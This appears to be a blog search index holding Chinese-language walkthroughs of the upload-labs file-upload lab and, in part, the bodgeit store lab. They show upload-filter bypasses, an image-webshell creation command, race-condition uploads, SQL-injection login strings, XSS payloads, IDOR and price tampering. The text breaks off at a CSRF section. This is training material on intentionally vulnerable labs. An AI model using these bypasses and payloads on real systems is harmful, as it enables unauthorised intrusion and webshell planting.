<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>upload文件上传靶场</title>
      <link href="/posts/1702.html"/>
      <url>/posts/1702.html</url>
      
        <content type="html"><![CDATA[<h1 id="1、PASS-01——js绕过"><a href="#1、PASS-01——js绕过" class="headerlink" title="1、PASS-01——js绕过"></a>1、PASS-01——js绕过</h1><p>上传php后缀文件时，弹出不允许上传，查看源代码，发现这是前端js拦截。</p><img src="/posts/undefined/1.png" class><p>那就先上传一个正常的11.jpg，然后用burp抓包将11.jpg改成22.php就可以啦。修改点击发送，发现已经上传成功啦。</p><img src="/posts/undefined/1_2.png" class><h1 id="2、PASS-02——content-type检测绕过"><a href="#2、PASS-02——content-type检测绕过" class="headerlink" title="2、PASS-02——content-type检测绕过"></a>2、PASS-02——content-type检测绕过</h1><p>上传2.php时，提示文件类型不正确，查看源码，发现对content-type做了限制。</p><p>那就先上传2.php，然后用burp抓包，将content-type改成其中一个合法的就行。</p><p>抓包获取到的：</p><img src="/posts/undefined/2.png" class><p>修改成合法的（image/jpeg或image/png或image/gif）：</p><img src="/posts/undefined/2_2.png" class><p>上传成功：</p><h1 id="3、PASS-03——其他后缀名绕过"><a href="#3、PASS-03——其他后缀名绕过" class="headerlink" title="3、PASS-03——其他后缀名绕过"></a>3、PASS-03——其他后缀名绕过</h1><p>上传2.php,发现出现提示信息：</p><img src="/posts/undefined/3.png" class><p>这很有可能是设置了黑名单，查看一下源代码。</p><p>既然源代码中只设置了这几种可执行后缀的黑名单，那就直接尝试上传其他可执行后缀的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">'.asp'</span>,<span class="token string">'.aspx'</span>,<span class="token string">'.php'</span>,<span class="token string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传2.php3文件，抓包，可显示图片路径，成功上传：</p><img src="/posts/undefined/3_2.png" class><h1 id="4、PASS-04——-htaccess解析绕过"><a href="#4、PASS-04——-htaccess解析绕过" class="headerlink" title="4、PASS-04——.htaccess解析绕过"></a>4、PASS-04——.htaccess解析绕过</h1><p>上传php文件，查看源代码，发现还是设置了黑名单，只是这次好像把能禁用的后缀都禁用掉了：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">".php"</span>,<span class="token string">".php5"</span>,<span class="token string">".php4"</span>,<span class="token string">".php3"</span>,<span class="token string">".php2"</span>,<span class="token string">".php1"</span>,<span class="token string">".html"</span>,<span class="token string">".htm"</span>,<span class="token string">".phtml"</span>,<span class="token string">".pht"</span>,<span class="token string">".pHp"</span>,<span class="token string">".pHp5"</span>,<span class="token string">".pHp4"</span>,<span class="token string">".pHp3"</span>,<span class="token string">".pHp2"</span>,<span class="token string">".pHp1"</span>,<span class="token string">".Html"</span>,<span class="token string">".Htm"</span>,<span class="token string">".pHtml"</span>,<span class="token string">".jsp"</span>,<span class="token string">".jspa"</span>,<span class="token string">".jspx"</span>,<span class="token string">".jsw"</span>,<span class="token string">".jsv"</span>,<span class="token string">".jspf"</span>,<span class="token string">".jtml"</span>,<span class="token string">".jSp"</span>,<span class="token string">".jSpx"</span>,<span class="token string">".jSpa"</span>,<span class="token string">".jSw"</span>,<span class="token string">".jSv"</span>,<span class="token string">".jSpf"</span>,<span class="token string">".jHtml"</span>,<span class="token string">".asp"</span>,<span class="token string">".aspx"</span>,<span class="token string">".asa"</span>,<span class="token string">".asax"</span>,<span class="token string">".ascx"</span>,<span class="token string">".ashx"</span>,<span class="token string">".asmx"</span>,<span class="token string">".cer"</span>,<span class="token string">".aSp"</span>,<span class="token string">".aSpx"</span>,<span class="token string">".aSa"</span>,<span class="token string">".aSax"</span>,<span class="token string">".aScx"</span>,<span class="token string">".aShx"</span>,<span class="token string">".aSmx"</span>,<span class="token string">".cEr"</span>,<span class="token string">".sWf"</span>,<span class="token string">".swf"</span>,<span class="token string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现它没有禁止上传.htaccess后缀，那就尝试上传这个，</p><p>.htaccess的内容为(.htaccess不能起名字，它就是.htaccess文件)：</p><p>SetHandler application/x-httpd-php</p><p>(代码意思：无论上传哪种类型的文件，他就会被解析为.php)</p><p>Burp抓包，将.htaccess文件修改成1.jpg，里面的内容写上php代码，点击发送：</p><img src="/posts/undefined/4.png" class><img src="/posts/undefined/4_2.png" class><p>此时，访问1.jpg就会转换成php文件：</p><img src="/posts/undefined/4_3.png" class><h1 id="5、PASS-05——点空格点绕过"><a href="#5、PASS-05——点空格点绕过" class="headerlink" title="5、PASS-05——点空格点绕过"></a>5、PASS-05——点空格点绕过</h1><p>上传一个php代码，显示此文件类型不允许上传。查看源代码，黑名单限制，这题把.htaccess后缀也限制了。感觉都被限制了呀，但好像那些限制条件都只限制了一次，先去除文件后缀点再去除空格。若此时设置为文件名点空格点（即2.php. .），删掉一个点一个空格，还剩下2.php.</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$file_ext</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //转换为小写      <span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token string">'::<span class="token variable">$DATA</span>'</span>, <span class="token string">''</span>, <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Burp抓包，修改2.php为2.php. .文件成功上传:</p><img src="/posts/undefined/5.png" class><h1 id="6、PASS-06——大小写绕过"><a href="#6、PASS-06——大小写绕过" class="headerlink" title="6、PASS-06——大小写绕过"></a>6、PASS-06——大小写绕过</h1><p>上传php文件不被允许上传，查看源代码，仔细观察，发现这题居然没有设置大小写转换，那我就直接尝试大小写绕过啦。其实PASS-05的思路这题同样适用。</p><p>抓包，修改2.php为2.Php，成功上传：</p><img src="/posts/undefined/6.png" class><img src="/posts/undefined/6_2.png" class><h1 id="7、PASS-07——空格绕过"><a href="#7、PASS-07——空格绕过" class="headerlink" title="7、PASS-07——空格绕过"></a>7、PASS-07——空格绕过</h1><p>php文件不允许上传，我们还是来看源代码吧，一看没有写去掉末尾空格的代码呀，那就直接空格绕过上传咯。Burp抓包，将2.php修改成2.php 发现成功上传</p><img src="/posts/undefined/7.png" class><h1 id="8、PASS-08——点绕过"><a href="#8、PASS-08——点绕过" class="headerlink" title="8、PASS-08——点绕过"></a>8、PASS-08——点绕过</h1><p>直接上源代码，发现这题没有设置删除文件末尾的点的代码，那就在文件后面加点绕过啦。</p><p>这里点绕过的原理其实是利用windows的特性，在windows下，2.php.和2.php的效果是一样的。</p><p>Burp抓包，将2.php修改成2.php.成功上传。</p><img src="/posts/undefined/8.png" class><h1 id="9、PASS-09——-DATA绕过上传"><a href="#9、PASS-09——-DATA绕过上传" class="headerlink" title="9、PASS-09——::$DATA绕过上传"></a>9、PASS-09——::$DATA绕过上传</h1><p>查看源代码，发现这里没有去除字符串::$DATA的代码，于是我们可以使用::$DATA绕过上传。</p><p>Burp抓包，将2.php修改成2.php::$DATA，发现成功上传</p><img src="/posts/undefined/9.png" class><h1 id="10、PASS-10——点空格点绕过"><a href="#10、PASS-10——点空格点绕过" class="headerlink" title="10、PASS-10——点空格点绕过"></a>10、PASS-10——点空格点绕过</h1><p>这关的源代码和第五关一样，所以采用点空格点就能绕过。</p><p>Burp抓包，将2.php修改为2.php. .成功上传</p><img src="/posts/undefined/10.png" class><h1 id="11、PASS-11——双写绕过"><a href="#11、PASS-11——双写绕过" class="headerlink" title="11、PASS-11——双写绕过"></a>11、PASS-11——双写绕过</h1><p>查看源代码，发现将图片的后缀用空白代替了。这时可以双写后缀名绕过。</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$file_name</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token variable">$deny_ext</span>,<span class="token string">""</span>, <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用burp抓包，将2.php修改成2.pphphp成功上传</p><img src="/posts/undefined/11.png" class><h1 id="12、PASS-12——目录可控-00截断绕过（GET）"><a href="#12、PASS-12——目录可控-00截断绕过（GET）" class="headerlink" title="12、PASS-12——目录可控%00截断绕过（GET）"></a>12、PASS-12——目录可控%00截断绕过（GET）</h1><p>上传一个php文件，出现提示信息：</p><img src="/posts/undefined/12.png" class><p>说明可能设置了白名单，查看源代码：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$ext_arr</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">'jpg'</span>,<span class="token string">'png'</span>,<span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到的确是设置了白名单，可以采用%00截断。</p><p>满足%00截断的两个条件：</p><pre class="line-numbers language-bash"><code class="language-bash">条件1：php版本小于5.3.4条件2：要将magic_quotes_gpc关闭<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/undefined/12_2.png" class><p>上传1.jpg，burp抓包，将save_path=../upload/修改为save_path=../upload/2.php%00</p><p>这样就相当于上传了2.php，并对后面的图片1.jpg进行了截断，成功上传</p><img src="/posts/undefined/12_3.png" class><h1 id="13、PASS-13——目录可控-00截断绕过（POST）"><a href="#13、PASS-13——目录可控-00截断绕过（POST）" class="headerlink" title="13、PASS-13——目录可控%00截断绕过（POST）"></a>13、PASS-13——目录可控%00截断绕过（POST）</h1><p>上传一个php文件，也显示只允许上传.jpg|.png|.gif类型文件。应该也是设置了白名单，查看源代码。这题的代码好像跟PASS-12差不多耶，先抓包看看，发现明显不同，上一题中的save_path路径以GET方式直接显示出来了，这里的save_path明显是POST方式。所以我们可以用POST方式的%00截断绕过。</p><p>两者的区别就是GET会自行解码，POST不会自行解码，所以POST方式的需要我们手动将%00经过decoode进行解码。</p><p>Burp抓包，将../upload/修改为../upload/2.php%00</p><p>然后选中%00按如下方式进行decode，解码成功之后%00会看不见，实际存在。</p><img src="/posts/undefined/13.png" class><p>修改完成之后，点击发送，文件上传成功：</p><img src="/posts/undefined/13_2.png" class><h1 id="14、PASS-14——图片马绕过"><a href="#14、PASS-14——图片马绕过" class="headerlink" title="14、PASS-14——图片马绕过"></a>14、PASS-14——图片马绕过</h1><p>本题要求：</p><pre class="line-numbers language-bash"><code class="language-bash">上传图片马到服务器。注意：1.保证上传后的图片马中仍然包含完整的一句话或webshell代码。2.使用文件包含漏洞能运行图片马中的恶意代码。3.图片马要.jpg,.png,.gif三种后缀都上传成功才算过关！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，制作图片马，在cmd中输入：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 1.jpg/b+2.php/a 3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成包含webshell的3.jpg，直接上传3.jpg。</p><p>本题直接说明存在文件上传漏洞：</p><img src="/posts/undefined/14.png" class><p>于是，上传之后，抓包，查看文件路径，</p><img src="/posts/undefined/14_2.png" class><p>访问：</p><img src="/posts/undefined/14_3.png" class><p>.png和.gif的后缀按照同样的方法制作图片马，并上传，能够成功访问：</p><img src="/posts/undefined/14_4.png" class><img src="/posts/undefined/14_5.png" class><h1 id="15、PASS-15——getimagesize-图片马绕过"><a href="#15、PASS-15——getimagesize-图片马绕过" class="headerlink" title="15、PASS-15——getimagesize()图片马绕过"></a>15、PASS-15——getimagesize()图片马绕过</h1><p>本关卡要求和上一关一样，首先查看源代码，发现有：</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$info</span> <span class="token operator">=</span> getimagesize<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>getimagesize()函数会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。还是制作图片马上传即可。</p><p>制作图片马：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 1.jpg/b+2.php/a 3.jpgcopy 1.png/b+2.php/a 3.pngcopy 1.gif/b+2.php/a 3.gif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分别上传，使用文件包含漏洞访问上传的图片马中的恶意代码：</p><img src="/posts/undefined/15.png" class><h1 id="16、PASS-16——exif-imagetype-图片马绕过"><a href="#16、PASS-16——exif-imagetype-图片马绕过" class="headerlink" title="16、PASS-16——exif_imagetype()图片马绕过"></a>16、PASS-16——exif_imagetype()图片马绕过</h1><p>查看源码，exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$image_type</span> <span class="token operator">=</span> exif_imagetype<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本题需要开启php_exif模块</p><img src="/posts/undefined/16.png" class><p>解题过程跟PASS-14和PASS-15一样，利用图片马上传绕过。</p><p>使用文件包含漏洞访问上传的图片马中的恶意代码：</p><img src="/posts/undefined/16_2.png" class><h1 id="17、PASS-17——图片二次渲染绕过"><a href="#17、PASS-17——图片二次渲染绕过" class="headerlink" title="17、PASS-17——图片二次渲染绕过"></a>17、PASS-17——图片二次渲染绕过</h1><p>查看源码，发现图片经过了二次渲染。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$im</span> <span class="token operator">=</span> imagecreatefromjpeg<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>imagecreatefromjpeg()函数，二次渲染是会创建一个新图像，导致图片马的数据丢失，上传图片马失败。所以要绕过imagecreatefromjpeg()函数进行上传。</p><p>关于gif的图片比较简单：</p><pre class="line-numbers language-bash"><code class="language-bash">原理大致就是先上传一张正常的gif图片，将经过二次渲染的图片下载下来。然后利用工具找到两张图片渲染前后相同的部分，在相同部分写入webshell，再上传，即可成功绕过二次渲染。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体步骤，首先，先上传一张正常的图片2.gif，将生成的32421.gif与原来的2.gif进行对比，查找渲染前后没有变化的部分。用一个可以查看十六进制的工具，我用的是winhex，将两张图片放进去，然后在查看处选择同步和比较。</p><img src="/posts/undefined/17.png" class><p>这种白色的都是相同的，黑色部分则是不相同的。</p><img src="/posts/undefined/17_2.png" class><p>只需要在2.gif的白色部分，即相同部分，插入恶意代码即可。</p><img src="/posts/undefined/17_3.png" class><p>将其另存为22.gif，然后上传到服务器。利用文件包含漏洞即可绕过二次渲染。</p><img src="/posts/undefined/17_4.png" class><p>至于jpg和png的，用上面这种方法是不行的，你会发现当你在比较渲染前后图片相同位置时，都是一些断断速速的点，根本插不进去的。这里具体的实现还是要利用一些写的脚本，将webshell插入进去。具体实现可以参考[这篇文章](<a href="https://xz.aliyun.com/t/2657">upload-labs之pass 16详细分析 - 先知社区 (aliyun.com)</a>)</p><h1 id="18、PASS-18——条件竞争绕过"><a href="#18、PASS-18——条件竞争绕过" class="headerlink" title="18、PASS-18——条件竞争绕过"></a>18、PASS-18——条件竞争绕过</h1><p>查看源代码，发现本关卡是先将图片上传到服务器，再判断文件后缀是否在白名单，在则重命名，不在则删除。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$upload_file</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'/'</span> <span class="token keyword">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$upload_file</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        if<span class="token punctuation">(</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>,<span class="token variable">$ext_arr</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'/'</span><span class="token keyword">.</span> rand<span class="token punctuation">(</span>10, 99<span class="token punctuation">)</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.<span class="token string">"."</span><span class="token keyword">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             rename<span class="token punctuation">(</span><span class="token variable">$upload_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            unlink<span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那我们就可以利用条件竞争来绕过。看看谁比谁快（bushi）。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。</p><p>上传一个2.php文件，burp抓包，将其发送给测试器Intruder，在position处清除负载。在payloads选择没有负载（Null payloads）,有效载荷选项（payload options）选择无限期地重复（continue indefinitely）。在options处将线程数调高一点，如20。</p><img src="/posts/undefined/18.png" class><img src="/posts/undefined/18_2.png" class><p>点击攻击，这边在不停的上传：</p><img src="/posts/undefined/18_3.png" class><p>我们打开另一个浏览器，访问2.php的路径，找不到我就一直访问，总有你还没来得及删掉的时候吧，然后我第二次就直接访问到啦：</p><img src="/posts/undefined/18_4.png" class><h1 id="19、PASS-19——条件竞争绕过"><a href="#19、PASS-19——条件竞争绕过" class="headerlink" title="19、PASS-19——条件竞争绕过"></a>19、PASS-19——条件竞争绕过</h1><p>查看源代码，这关是检查了后缀名，然后上传，然后再进行二次渲染。所以我们只能上传图片马，然后配合解析漏洞（即访问地址加上include.php?file）即可成功绕过。</p><p>这题的上传路径有点问题，没有上传到upload/upload目录下，所以我们先打开PASS-19的myupload.php修改一下路径：</p><img src="/posts/undefined/19.png" class><p>先制作一张包含恶意代码的图片马：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 1.jpg/b+2/php/a 3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后上传3.jpg，并用burp抓包，其他操作跟PASS-18一样，发送到测试器，对它不断进行上传。</p><img src="/posts/undefined/19_2.png" class><p>然后打开另一浏览器，不断访问图片地址(<a href="http://192.168.56.1:8099/upload/include.php?file=upload/3.jpg">http://192.168.56.1:8099/upload/include.php?file=upload/3.jpg</a>)</p><img src="/posts/undefined/19_3.png" class><h1 id="20、PASS-20——-绕过"><a href="#20、PASS-20——-绕过" class="headerlink" title="20、PASS-20——/.绕过"></a>20、PASS-20——/.绕过</h1><p>查看源代码，本题是设置了一个黑名单，然后发现有一个move_uploaded_file()函数。这个函数有个特性，就是会忽略文件末尾的 /.   (或者用.也可以)</p><p>也就是说，我们先上传一张正常的图片1.jpg，然后用burp抓包，将upload-19.jpg改为2.php/.此时会上传2.php文件，并自动忽略/.后面的内容，即忽略1.jpg</p><img src="/posts/undefined/20.png" class><p>还有一个方法。这个函数的img_path是由post参数的save_name控制的。所以可以利用POST方式的%00截断。</p><p>先上传一张正常的图片1.jpg,并用burp抓包，找到save_name,将upload-19.jpg改为2.php%00,并将%00进行url的decode，上传成功</p><img src="/posts/undefined/20_2.png" class><h1 id="21、PASS-21——数组绕过"><a href="#21、PASS-21——数组绕过" class="headerlink" title="21、PASS-21——数组绕过"></a>21、PASS-21——数组绕过</h1><p>查看源码，如果是数组的话就不会检查后缀。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$ext</span>, <span class="token variable">$allow_suffix</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>采用第一个数组和第二个数组拼接</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$file_name</span> <span class="token operator">=</span> reset<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token keyword">.</span> <span class="token string">'.'</span> <span class="token keyword">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span>count<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> - 1<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那就可以利用数组绕过。</p><p>在这里，数组的下标不能相邻就行，比如第一个数组下标为0，第二个就要大于1，才不会被拼接起来。</p><p>首先，构造表单，能够数组上传，然后上传一张正常的照片1.jpg</p><img src="/posts/undefined/21.png" class><p>Burp抓包，点击发送，成功上传</p><img src="/posts/undefined/21_2.png" class><h1 id="22、总结"><a href="#22、总结" class="headerlink" title="22、总结"></a>22、总结</h1><p>最后，放上一张关于文件上传漏洞的总结图</p><img src="/posts/undefined/22.png" class>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bodgeit靶场</title>
      <link href="/posts/1d0a.html"/>
      <url>/posts/1d0a.html</url>
      
        <content type="html"><![CDATA[<p>这两天在学长的引导下，我把bodgeit靶场练习了一下。以下是我练习的一些关卡。</p><span id="more"></span><p>在About Us中的Scoring page中可以查看关卡：</p><img src="/posts/1d0a/0.png" class><h1 id="1、利用注入漏洞万能密码登录账号"><a href="#1、利用注入漏洞万能密码登录账号" class="headerlink" title="1、利用注入漏洞万能密码登录账号"></a>1、利用注入漏洞万能密码登录账号</h1><p>尝试构造万能密码：</p><pre class="line-numbers language-bash"><code class="language-bash">test@thebodgeitstore.com<span class="token string">' or '</span>1<span class="token string">'='</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/1d0a/1.png" class><p>发现登录成功：</p><img src="/posts/1d0a/1_2.png" class><p>可以查看一下源代码，在login.jsp中，</p><img src="/posts/1d0a/1_3.png" class><p>其余两个用户也构造同样的万能密码：</p><pre class="line-numbers language-bash"><code class="language-bash">user1@thebodgeitstore.com<span class="token string">' or '</span>1<span class="token string">'='</span>1<span class="token comment" spellcheck="true">#</span>admin@thebodgeitstore.com<span class="token string">' or '</span>1<span class="token string">'='</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/1d0a/1_4.png" class><img src="/posts/1d0a/1_5.png" class><h1 id="2、xss漏洞"><a href="#2、xss漏洞" class="headerlink" title="2、xss漏洞"></a>2、xss漏洞</h1><h2 id="（1）反射型XSS"><a href="#（1）反射型XSS" class="headerlink" title="（1）反射型XSS"></a>（1）反射型XSS</h2><p>发现search模块有个搜索框，尝试使用xss构造。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/1d0a/2.png" class><p>成功出现弹窗，说明存在xss漏洞。</p><img src="/posts/1d0a/2_1.png" class><h2 id="（2）存储型XSS"><a href="#（2）存储型XSS" class="headerlink" title="（2）存储型XSS"></a>（2）存储型XSS</h2><p>既然发现有反射型XSS漏洞，再找找存储型XSS。在Contact Us模块还有一个输入框。先尝试一下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现屏蔽掉了一些关键字：</p><img src="/posts/1d0a/2_2.png" class><p>可能是对某些关键字进行了过滤，再尝试一下大小写绕过：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>ScRipt<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/ScRipt<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现成功啦！</p><img src="/posts/1d0a/2_3.png" class><p>此时，查看一下源码，发现的确是对<script>和</script>进行特殊处理：</p><img src="/posts/1d0a/2_4.png" class><p>在注册处还存在一个xss，</p><pre class="line-numbers language-bash"><code class="language-bash">注册账号：test@qq.com<span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>密码：12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/1d0a/2_5.png" class><p>点击register注册后，会：</p><img src="/posts/1d0a/2_6.png" class><h1 id="3、以非管理员用户身份查找隐藏内容"><a href="#3、以非管理员用户身份查找隐藏内容" class="headerlink" title="3、以非管理员用户身份查找隐藏内容"></a>3、以非管理员用户身份查找隐藏内容</h1><p>在普通用户页面，查看源代码，发现有个被注释掉的超链接Admin,而它的页面对应为admin.jsp，有可能是后台</p><img src="/posts/1d0a/3.png" class><p>直接在网址输入即可访问，的确为后台：</p><img src="/posts/1d0a/3_2.png" class><h1 id="4、访问其他人的购物篮"><a href="#4、访问其他人的购物篮" class="headerlink" title="4、访问其他人的购物篮"></a>4、访问其他人的购物篮</h1><p>通过burp，修改b_id值，就可以越权访问其他人的购物篮。 其他人的BasketId在我们之前发现的admin后台处可以直接查看：</p><img src="/posts/1d0a/4.png" class><p>这里我们登录<a href="mailto:&#x74;&#101;&#115;&#x74;&#x40;&#x74;&#x68;&#101;&#98;&#x6f;&#100;&#103;&#x65;&#x69;&#116;&#115;&#x74;&#111;&#x72;&#x65;&#46;&#99;&#x6f;&#109;">&#x74;&#101;&#115;&#x74;&#x40;&#x74;&#x68;&#101;&#98;&#x6f;&#100;&#103;&#x65;&#x69;&#116;&#115;&#x74;&#111;&#x72;&#x65;&#46;&#99;&#x6f;&#109;</a>这个账号，点击Your Basket界面，并提交到burp</p><img src="/posts/1d0a/4_2.png" class><p>这里我们将b_id值改为10，即查看<a href="mailto:&#x74;&#101;&#115;&#x74;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;">&#x74;&#101;&#115;&#x74;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;</a>的购物篮，点击发送：</p><img src="/posts/1d0a/4_3.png" class><p>可以看到，此时，已经出现了<a href="mailto:&#116;&#101;&#x73;&#116;&#x40;&#113;&#113;&#46;&#99;&#x6f;&#x6d;">&#116;&#101;&#x73;&#116;&#x40;&#113;&#113;&#46;&#99;&#x6f;&#x6d;</a>的购物篮</p><img src="/posts/1d0a/4_4.png" class><h1 id="5、让商店欠你钱"><a href="#5、让商店欠你钱" class="headerlink" title="5、让商店欠你钱"></a>5、让商店欠你钱</h1><p>登录一个普通账号，在Your Basket界面，点击Update Basket，并用burp进行抓取</p><img src="/posts/1d0a/5.png" class><p>直接修改quantity的值，将其变成负数:</p><img src="/posts/1d0a/5_2.png" class><p>然后再发送回来，就可以让数量变成负数，此时的价格当然也变成了负，现在商店要给你付钱啦哈哈哈。</p><img src="/posts/1d0a/5_3.png" class><h1 id="6、CSRF漏洞"><a href="#6、CSRF漏洞" class="headerlink" title="6、CSRF漏洞"></a>6、CSRF漏洞</h1><p>修改密码处有个CSRF漏洞。 登录账号<a 